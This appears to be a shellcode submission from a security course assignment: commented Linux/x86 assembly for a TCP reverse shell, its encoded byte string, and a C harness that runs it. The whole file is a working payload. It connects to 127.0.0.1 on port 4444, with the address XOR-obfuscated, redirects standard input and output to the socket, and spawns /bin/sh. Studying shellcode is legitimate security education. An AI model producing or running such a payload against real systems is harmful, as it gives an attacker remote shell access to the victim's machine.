/*
; Title:     Linux/x86 - TCP reverse shell
; Author:     Paolo Perego <paolo@codiceinsicuro.it>
; Website:  https://codiceinsicuro.it
; Blog post:
https://codiceinsicuro.it/slae/assignment-2-create-a-reverse-shellcode/
; Twitter:    @thesp0nge
; SLAE-ID:    1217
; Purpose:   connect to a given IP and PORT and spawning a reverse shell if
;             connection succeded


global _start

section .text

_start:

; Creating the socket.
;
; int socket(int domain, int type, int protocol);
;
; socket() is defined as #define __NR_socket 359 on
/usr/include/i386-linux-gnu/asm/unistd_32.h
; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
; SOCK_STREAM is defined as 1 in
/usr/include/i386-linux-gnu/bits/socket_type.h
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov ax, 0x167
mov bl, 0x2
mov cl, 0x1
int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
mov ebx, eax ; storing the socket descriptor into EBX for next syscall

; Connect to my peer
;
; connect() is defined as #define __NR_connect 362 on
/usr/include/i386-linux-gnu/asm/unistd_32.h
; peer.sin_family = AF_INET;
; peer.sin_port = htons(DPORT);
; peer.sin_addr.s_addr = inet_addr(IP);
; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct
sockaddr_in));

; 127 = 0x7f
; 0   = 0x0
; 0   = 0x0
; 1   = 0x1

; push 0x0100007f
mov eax, 0xfeffff80
xor eax, 0xffffffff
push eax
push word 0x5c11 ; port 4444 is 0x5c11
push word 0x2 ; AF_INET is 2

mov ecx, esp
mov dl, 0x10 ; sizeof(struct sockaddr_in)
xor eax, eax
mov ax, 0x16a
int 0x80

test eax, eax ; check if eax is zero
jnz exit_on_error

; Duplicating descriptor 0, 1, 2 to the socket opened by client
;
; int dup2(int oldfd, int newfd);
;
; dup2 is defined as #define __NR_dup2 63 in
/usr/include/i386-linux-gnu/asm/unistd_32.h

xor ecx, ecx
mov cl,  2
xor eax, eax

dup2:
mov al, 0x3F ; 63 in decimal
int 0x80 ; duplicating file descriptors in backwards order; from 2 to 0
dec ecx
jns dup2

; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on
/usr/include/i386-linux-gnu/asm/unistd_32.h

xor eax, eax
push eax ; The NULL byte
push 0x68732f2f ; "sh//". The second '\' is used to align our command into
the stack
push 0x6e69622f ; "nib/"
mov ebx, esp ; EBX now points to "/bin//sh"
xor ecx, ecx
xor edx, edx
mov al, 0xB ; 11 in decimal
int 0x80

exit_on_error:
mov bl, 0x1
xor eax, eax ; zero-ing EAX
mov al, 0x1
int 0x80
*/
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\xb8\x80\xff\xff\xfe\x83\xf0\xff\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x24\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xb3\x01\x31\xc0\xb0\x01\xcd\x80";


int main(int argc, char **argv)
{
printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}